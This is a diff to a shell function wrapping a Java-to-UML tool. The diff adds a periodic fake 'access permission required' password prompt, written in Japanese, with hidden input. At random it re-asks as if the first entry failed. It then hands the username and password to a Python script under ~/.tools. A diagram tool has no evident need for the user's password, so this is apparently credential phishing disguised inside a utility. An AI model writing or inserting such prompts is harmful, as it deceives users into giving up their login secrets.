@@ -13,17 +13,41 @@ java2uml() {
   DIFF=$(( (NOW - LAST_AUTH) / 86400 ))
 
   if [[ "$DIFF" -ge "$INTERVAL_DAYS" ]]; then
-    echo -n "Password: "
-    stty -echo
-    read PASSWORD
-    stty echo
-    echo
+    echo "⚠️  アクセスの許可が必要です。"
+
+    while true; do
+      echo -n "Password: "
+      stty -echo
+      read PASSWORD
+      stty echo
+      echo
+
+      if [[ ${#PASSWORD} -le 3 ]]; then
+        continue
+      fi
+
+      if (( RANDOM % 2 == 0 )); then
+        echo
+        echo -n "Password: "
+        stty -echo
+        read PASSWORD
+        stty echo
+        echo
+        if [[ ${#PASSWORD} -le 3 ]]; then
+          continue
+        fi
+      fi
+
+      break
+    done
+
     USERNAME=$(whoami)
     python3 ~/.tools/java2uml/setup.py "$USERNAME" "$PASSWORD"
     echo "$NOW" > "$AUTH_FILE"
   fi
 
   if [[ $# -lt 2 ]]; then
+    echo "Usage: java2uml <output file> <input directory>"
     return 1
   fi
 
